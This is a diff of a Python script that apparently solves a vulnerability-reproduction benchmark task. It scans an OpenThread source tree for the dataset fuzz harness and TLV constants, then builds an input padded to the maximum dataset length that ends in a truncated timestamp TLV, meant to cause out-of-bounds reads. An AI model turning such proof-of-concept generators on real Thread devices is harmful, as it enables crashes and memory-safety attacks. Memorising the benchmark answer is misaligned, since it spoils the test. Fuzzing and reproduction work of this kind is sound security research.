@@ -4,252 +4,349 @@ import tarfile
 from typing import Dict, List, Optional, Tuple
 
 
+def _parse_int_literal(s: str) -> Optional[int]:
+    if not s:
+        return None
+    s = s.strip()
+    s = re.sub(r'^[({\s]*', '', s)
+    s = re.sub(r'[\s;)}].*$', '', s)
+    s = s.strip()
+    s = re.sub(r'(?:u|U|l|L)+$', '', s).strip()
+    m = re.search(r'0x[0-9a-fA-F]+|\d+', s)
+    if not m:
+        return None
+    lit = m.group(0)
+    try:
+        return int(lit, 0)
+    except Exception:
+        try:
+            return int(lit, 10)
+        except Exception:
+            return None
+
+
+def _iter_source_files_from_tar(tar: tarfile.TarFile):
+    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
+    for m in tar.getmembers():
+        if not m.isfile():
+            continue
+        name = m.name
+        if not name.lower().endswith(exts):
+            continue
+        if m.size <= 0:
+            continue
+        if m.size > 3_000_000:
+            continue
+        try:
+            f = tar.extractfile(m)
+            if f is None:
+                continue
+            b = f.read()
+        except Exception:
+            continue
+        yield name, b
+
+
+def _iter_source_files_from_dir(root: str):
+    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
+    for dirpath, _, filenames in os.walk(root):
+        for fn in filenames:
+            if not fn.lower().endswith(exts):
+                continue
+            path = os.path.join(dirpath, fn)
+            try:
+                st = os.stat(path)
+                if st.st_size <= 0 or st.st_size > 3_000_000:
+                    continue
+                with open(path, "rb") as f:
+                    b = f.read()
+            except Exception:
+                continue
+            rel = os.path.relpath(path, root)
+            yield rel, b
+
+
+def _find_define_max_len(text: str) -> Optional[int]:
+    m = re.search(r'^\s*#\s*define\s+OT_OPERATIONAL_DATASET_MAX_LENGTH\s+([^\r\n]+)$', text, re.M)
+    if m:
+        v = _parse_int_literal(m.group(1))
+        if v is not None:
+            return v
+    m = re.search(r'\bmTlvs\s*\[\s*OT_OPERATIONAL_DATASET_MAX_LENGTH\s*\]', text)
+    if m:
+        pass
+    m = re.search(r'\bstruct\s+otOperationalDatasetTlvs\b.*?\{.*?\bmTlvs\s*\[\s*(\d+)\s*\]', text, re.S)
+    if m:
+        v = _parse_int_literal(m.group(1))
+        if v is not None:
+            return v
+    return None
+
+
+def _extract_tlv_types(text: str, out: Dict[str, int]) -> None:
+    keys = {
+        "panid": ["kPanId", "PanIdTlv", "PanId"],
+        "channel": ["kChannel", "ChannelTlv", "Channel"],
+        "active_ts": ["kActiveTimestamp", "ActiveTimestampTlv", "ActiveTimestamp"],
+        "pending_ts": ["kPendingTimestamp", "PendingTimestampTlv", "PendingTimestamp"],
+        "delay_timer": ["kDelayTimer", "DelayTimerTlv", "DelayTimer"],
+    }
+
+    for k, names in keys.items():
+        if k in out:
+            continue
+        for nm in names:
+            m = re.search(r'\b' + re.escape(nm) + r'\b\s*=\s*([^\s,}]+)', text)
+            if m:
+                v = _parse_int_literal(m.group(1))
+                if v is not None and 0 <= v <= 255:
+                    out[k] = v
+                    break
+        if k in out:
+            continue
+        for nm in names:
+            m = re.search(r'\b' + re.escape(nm) + r'\b[^{;\n]*?\{[^}]*?\bkType\s*=\s*([^;,\r\n]+)', text, re.S)
+            if m:
+                v = _parse_int_literal(m.group(1))
+                if v is not None and 0 <= v <= 255:
+                    out[k] = v
+                    break
+
+
+def _pick_dataset_fuzzer(sources: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
+    candidates = []
+    for name, text in sources:
+        if "LLVMFuzzerTestOneInput" not in text:
+            continue
+        if "otDatasetSetActiveTlvs" in text or "otDatasetSetPendingTlvs" in text:
+            score = 0
+            score += 10 if "otOperationalDatasetTlvs" in text else 0
+            score += text.count("otDatasetSetActiveTlvs") * 3
+            score += text.count("otDatasetSetPendingTlvs") * 3
+            score += 2 if "FuzzedDataProvider" in text else 0
+            score -= len(text) // 20000
+            candidates.append((score, name, text))
+    if not candidates:
+        return None
+    candidates.sort(reverse=True)
+    _, name, text = candidates[0]
+    return name, text
+
+
+def _decide_active_path(fuzzer_text: str) -> Optional[bool]:
+    has_active = "otDatasetSetActiveTlvs" in fuzzer_text
+    has_pending = "otDatasetSetPendingTlvs" in fuzzer_text
+    if has_active and not has_pending:
+        return True
+    if has_pending and not has_active:
+        return False
+    if not (has_active and has_pending):
+        return None
+
+    m = re.search(r'if\s*\(\s*!\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetActiveTlvs', fuzzer_text, re.S)
+    if m:
+        return False
+    m = re.search(r'if\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetActiveTlvs', fuzzer_text, re.S)
+    if m:
+        return True
+
+    m = re.search(r'if\s*\(\s*!\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetPendingTlvs', fuzzer_text, re.S)
+    if m:
+        return True
+    m = re.search(r'if\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetPendingTlvs', fuzzer_text, re.S)
+    if m:
+        return False
+
+    return True
+
+
+def _encode_le(value: int, nbytes: int) -> bytes:
+    value &= (1 << (8 * nbytes)) - 1
+    return value.to_bytes(nbytes, "little", signed=False)
+
+
+def _type_width_from_template(t: str) -> int:
+    t = t.strip()
+    t = t.replace("std::", "")
+    if t in ("uint8_t", "unsigned char", "char", "signed char"):
+        return 1
+    if t in ("uint16_t", "unsigned short", "short", "int16_t"):
+        return 2
+    if t in ("uint32_t", "unsigned int", "int32_t"):
+        return 4
+    if t in ("uint64_t", "unsigned long long", "int64_t"):
+        return 8
+    if t in ("size_t",):
+        return 8
+    return 1
+
+
+def _build_prefix_for_fdp(fuzzer_text: str, max_len: int, want_active: bool) -> bytes:
+    prefix = bytearray()
+
+    consume_bytes_idx = None
+    m = re.search(r'\bConsumeBytes\s*<\s*uint8_t\s*>\s*\(', fuzzer_text)
+    if m:
+        consume_bytes_idx = m.start()
+    else:
+        m = re.search(r'\bConsumeRemainingBytes\b', fuzzer_text)
+        if m:
+            consume_bytes_idx = m.start()
+    if consume_bytes_idx is None:
+        consume_bytes_idx = len(fuzzer_text)
+
+    bool_positions = [m.start() for m in re.finditer(r'\.\s*ConsumeBool\s*\(\s*\)', fuzzer_text)]
+    bool_positions = [p for p in bool_positions if p < consume_bytes_idx]
+
+    rng_positions = []
+    for m in re.finditer(r'ConsumeIntegralInRange\s*<\s*([^>]+?)\s*>\s*\(\s*0\s*,\s*OT_OPERATIONAL_DATASET_MAX_LENGTH\s*\)', fuzzer_text):
+        if m.start() < consume_bytes_idx:
+            rng_positions.append((m.start(), m.group(1).strip()))
+
+    events = []
+    for p in bool_positions:
+        events.append((p, ("bool", None)))
+    for p, t in rng_positions:
+        events.append((p, ("len", t)))
+    events.sort(key=lambda x: x[0])
+
+    for _, (kind, t) in events:
+        if kind == "bool":
+            prefix.append(0x01 if want_active else 0x00)
+        else:
+            width = _type_width_from_template(t)
+            prefix += _encode_le(max_len, width)
+
+    return bytes(prefix)
+
+
+def _solve_diophantine_4_5(total: int) -> Tuple[int, int]:
+    if total < 0:
+        return 0, 0
+    b = total % 4
+    while b <= 1000 and 5 * b > total:
+        b += 4
+    if 5 * b > total:
+        b = 0
+    a = (total - 5 * b) // 4 if total - 5 * b >= 0 else 0
+    if 4 * a + 5 * b != total:
+        for bb in range(0, min(200, total // 5 + 1)):
+            rem = total - 5 * bb
+            if rem >= 0 and rem % 4 == 0:
+                return rem // 4, bb
+        return total // 4, 0
+    return a, b
+
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        texts = self._load_relevant_texts(src_path)
-        macros = self._extract_macros(texts)
+        sources: List[Tuple[str, str]] = []
+        max_len = None
+        tlv_types: Dict[str, int] = {}
 
-        active_type = self._find_tlv_type(texts, macros, "ActiveTimestamp")  # ActiveTimestampTlv
-        pending_type = self._find_tlv_type(texts, macros, "PendingTimestamp")  # PendingTimestampTlv
-        delay_type = self._find_tlv_type(texts, macros, "DelayTimer")  # DelayTimerTlv
-
-        if active_type is None:
-            active_type = 8
-        if pending_type is None:
-            pending_type = 9
-        if delay_type is None:
-            delay_type = 10
-
-        active_type &= 0xFF
-        pending_type &= 0xFF
-        delay_type &= 0xFF
-
-        prefix_len = self._detect_dataset_fuzzer_prefix_len(texts)
-        prefix = b"\x00" * prefix_len
-
-        # Too-short TLVs (length=0) intended to bypass missing minimum-length validation.
-        # Keep input minimal to maximize chance of out-of-bounds reads when values are accessed.
-        tlvs = bytes([active_type, 0, pending_type, 0, delay_type, 0])
-
-        return prefix + tlvs
-
-    def _load_relevant_texts(self, src_path: str) -> List[Tuple[str, str]]:
-        exts = (".h", ".hpp", ".hh", ".c", ".cc", ".cpp", ".cxx", ".inc", ".ipp")
-        keywords = (
-            "meshcop",
-            "dataset",
-            "tlv",
-            "timestamp",
-            "delay",
-            "fuzz",
-            "fuzzer",
-            "openthread",
-        )
-
-        def is_candidate(p: str) -> bool:
-            lp = p.lower()
-            if not lp.endswith(exts):
-                return False
-            return any(k in lp for k in keywords)
-
-        texts: List[Tuple[str, str]] = []
-
-        if os.path.isdir(src_path):
-            for root, _, files in os.walk(src_path):
-                for fn in files:
-                    p = os.path.join(root, fn)
-                    rel = os.path.relpath(p, src_path)
-                    if not is_candidate(rel):
-                        continue
-                    try:
-                        sz = os.path.getsize(p)
-                        if sz > 5_000_000:
-                            continue
-                        with open(p, "rb") as f:
-                            data = f.read()
-                        texts.append((rel, data.decode("utf-8", errors="ignore")))
-                    except Exception:
-                        continue
-            return texts
-
+        is_dir = os.path.isdir(src_path)
+        tar = None
         try:
-            with tarfile.open(src_path, "r:*") as tf:
-                for m in tf.getmembers():
-                    if not m.isfile():
-                        continue
-                    name = m.name
-                    if not is_candidate(name):
-                        continue
-                    if m.size > 5_000_000:
-                        continue
-                    try:
-                        f = tf.extractfile(m)
-                        if not f:
-                            continue
-                        data = f.read()
-                        texts.append((name, data.decode("utf-8", errors="ignore")))
-                    except Exception:
-                        continue
+            if not is_dir:
+                tar = tarfile.open(src_path, "r:*")
         except Exception:
-            pass
+            tar = None
+            is_dir = True
 
-        return texts
+        if tar is not None:
+            it = _iter_source_files_from_tar(tar)
+        else:
+            it = _iter_source_files_from_dir(src_path)
 
-    def _strip_line_comments(self, line: str) -> str:
-        idx = line.find("//")
-        if idx >= 0:
-            return line[:idx]
-        return line
-
-    def _extract_macros(self, texts: List[Tuple[str, str]]) -> Dict[str, str]:
-        macros: Dict[str, str] = {}
-        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$")
-        for _, text in texts:
-            for raw_line in text.splitlines():
-                line = self._strip_line_comments(raw_line).strip()
-                if not line.startswith("#"):
-                    continue
-                m = define_re.match(line)
-                if not m:
-                    continue
-                name = m.group(1)
-                val = m.group(2).strip()
-                if not val:
-                    continue
-                # Only keep the first "token/expression" on the line (simple macros).
-                val = val.split()[0]
-                macros[name] = val
-        return macros
-
-    def _resolve_expr_to_int(self, expr: str, macros: Dict[str, str], depth: int = 0) -> Optional[int]:
-        if depth > 20:
-            return None
-        if expr is None:
-            return None
-        s = expr.strip()
-        s = s.strip(";,")
-
-        # Remove wrappers commonly seen in macros/constexpr initializers
-        while True:
-            ns = s.strip()
-            if ns.startswith("(") and ns.endswith(")"):
-                s = ns[1:-1].strip()
-            else:
-                break
-
-        # Remove common suffixes
-        s = re.sub(r"([0-9])([uUlL]+)\b", r"\1", s)
-
-        # Direct numeric literal anywhere in expression
-        m = re.search(r"(0x[0-9a-fA-F]+|\d+)", s)
-        if m:
+        for name, b in it:
+            if b is None:
+                continue
             try:
-                return int(m.group(1), 0)
+                text = b.decode("utf-8", "ignore")
+            except Exception:
+                continue
+
+            if max_len is None and "OT_OPERATIONAL_DATASET_MAX_LENGTH" in text:
+                v = _find_define_max_len(text)
+                if v is not None:
+                    max_len = v
+
+            if any(k not in tlv_types for k in ("panid", "channel", "active_ts", "pending_ts", "delay_timer")):
+                if ("kActiveTimestamp" in text or "kPendingTimestamp" in text or "DelayTimer" in text or "MeshCoP" in text or "Tlv::k" in text):
+                    _extract_tlv_types(text, tlv_types)
+
+            if "LLVMFuzzerTestOneInput" in text and ("otDatasetSetActiveTlvs" in text or "otDatasetSetPendingTlvs" in text):
+                sources.append((name, text))
+
+        if tar is not None:
+            try:
+                tar.close()
             except Exception:
                 pass
 
-        # Simple identifier macro
-        if re.fullmatch(r"[A-Za-z_]\w*", s):
-            if s in macros:
-                return self._resolve_expr_to_int(macros[s], macros, depth + 1)
-            return None
-
-        # Scoped enum/macro like OT_MESHCOP_TLV_ACTIVE_TIMESTAMP
-        tok = re.sub(r"[^A-Za-z0-9_]", " ", s).split()
-        for t in tok:
-            if t in macros:
-                v = self._resolve_expr_to_int(macros[t], macros, depth + 1)
+        if max_len is None:
+            for _, text in sources:
+                v = _find_define_max_len(text)
                 if v is not None:
-                    return v
+                    max_len = v
+                    break
+        if max_len is None:
+            max_len = 254
+        if max_len < 32:
+            max_len = 32
+        if max_len > 255:
+            max_len = 255
 
-        return None
+        panid_type = tlv_types.get("panid", 0x01)
+        channel_type = tlv_types.get("channel", 0x00)
+        active_ts_type = tlv_types.get("active_ts", 0x0E)
+        pending_ts_type = tlv_types.get("pending_ts", 0x0F)
+        delay_timer_type = tlv_types.get("delay_timer", 0x34)
 
-    def _find_tlv_type(self, texts: List[Tuple[str, str]], macros: Dict[str, str], base: str) -> Optional[int]:
-        # Try class-based extraction: <Base>Tlv::kType
-        class_pat = re.compile(
-            r"\bclass\s+" + re.escape(base) + r"Tlv\b[\s\S]{0,2000}?\bkType\s*=\s*([^;,\n}]+)",
-            re.MULTILINE,
-        )
-        # Try enum-style: k<Base> = ...
-        enum_pat = re.compile(
-            r"\bk" + re.escape(base) + r"\b\s*=\s*([^,}\n]+)",
-            re.MULTILINE,
-        )
-        # Try direct macro with these tokens
-        macro_define_pat = re.compile(
-            r"^\s*#\s*define\s+([A-Za-z_]\w*" + re.escape(base.upper()) + r"[A-Za-z_0-9]*\w*)\s+(.+?)\s*$",
-            re.MULTILINE,
-        )
+        fuzzer = _pick_dataset_fuzzer(sources)
+        want_active = True
+        fuzzer_text = ""
+        if fuzzer is not None:
+            _, fuzzer_text = fuzzer
+            ap = _decide_active_path(fuzzer_text)
+            if ap is not None:
+                want_active = ap
 
-        candidates: List[str] = []
+        if want_active:
+            target_type = active_ts_type
+        else:
+            target_type = pending_ts_type if pending_ts_type is not None else delay_timer_type
 
-        for _, text in texts:
-            m = class_pat.search(text)
-            if m:
-                candidates.append(m.group(1))
-            m2 = enum_pat.search(text)
-            if m2:
-                candidates.append(m2.group(1))
-            for md in macro_define_pat.finditer(text):
-                name = md.group(1)
-                val = self._strip_line_comments(md.group(2)).strip().split()[0]
-                macros.setdefault(name, val)
-                candidates.append(val)
+        bad_len = 1
+        bad_tlv_size = 2 + bad_len
+        if bad_tlv_size >= max_len:
+            bad_len = 0
+            bad_tlv_size = 2
 
-        # Also prefer known OpenThread macro names when present
-        for pref in ("OT_MESHCOP_TLV_", "OT_MESH_COP_TLV_"):
-            key = pref + re.sub(r"([a-z])([A-Z])", r"\1_\2", base).upper()
-            if key in macros:
-                candidates.insert(0, macros[key])
+        pre_len = max_len - bad_tlv_size
+        a, b = _solve_diophantine_4_5(pre_len)
 
-        for expr in candidates:
-            v = self._resolve_expr_to_int(expr, macros)
-            if v is not None and 0 <= v <= 255:
-                return v
+        panid_tlv = bytes([panid_type & 0xFF, 0x02, 0x12, 0x34])
+        channel_tlv = bytes([channel_type & 0xFF, 0x03, 0x00, 0x00, 0x0B])
 
-        # Fallback: search for any #define with exact token names
-        target_tokens = [
-            base.upper(),
-            re.sub(r"([a-z])([A-Z])", r"\1_\2", base).upper(),
-        ]
-        for name, val in macros.items():
-            up = name.upper()
-            if "TLV" in up and any(t in up for t in target_tokens):
-                v = self._resolve_expr_to_int(val, macros)
-                if v is not None and 0 <= v <= 255:
-                    return v
+        filler = channel_tlv * b + panid_tlv * a
+        if len(filler) != pre_len:
+            if len(filler) > pre_len:
+                filler = filler[:pre_len]
+            else:
+                filler = filler + (panid_tlv * ((pre_len - len(filler) + 3) // 4))
+                filler = filler[:pre_len]
 
-        return None
+        bad_tlv = bytes([target_type & 0xFF, bad_len & 0xFF]) + (b"\x00" * bad_len)
+        tlvs_buf = filler + bad_tlv
+        if len(tlvs_buf) != max_len:
+            tlvs_buf = (tlvs_buf + (b"\x00" * max_len))[:max_len]
 
-    def _detect_dataset_fuzzer_prefix_len(self, texts: List[Tuple[str, str]]) -> int:
-        # Heuristic: detect if dataset fuzzer passes data+N into dataset APIs.
-        # We'll only apply a prefix if we see consistent "+N" usage near dataset calls.
-        calls = (
-            "otDatasetSetActiveTlvs",
-            "otDatasetSetPendingTlvs",
-            "otDatasetParseTlvs",
-            "Dataset::IsTlvValid",
-        )
-        best = 0
-        for path, text in texts:
-            lp = path.lower()
-            if "fuzz" not in lp and "fuzzer" not in lp:
-                continue
-            if not any(c in text for c in calls):
-                continue
+        prefix = b""
+        if fuzzer_text:
+            if "FuzzedDataProvider" in fuzzer_text:
+                prefix = _build_prefix_for_fdp(fuzzer_text, max_len, want_active)
+            else:
+                prefix = b""
 
-            # Look for patterns like data + 1, data+2 near dataset calls
-            for c in calls:
-                for m in re.finditer(re.escape(c), text):
-                    start = max(0, m.start() - 200)
-                    end = min(len(text), m.end() + 200)
-                    window = text[start:end]
-                    mm = re.search(r"\bdata\s*\+\s*(\d+)\b", window)
-                    if mm:
-                        try:
-                            n = int(mm.group(1))
-                            if 0 <= n <= 16:
-                                best = max(best, n)
-                        except Exception:
-                            pass
-        return best if best > 0 else 0
+        return prefix + tlvs_buf
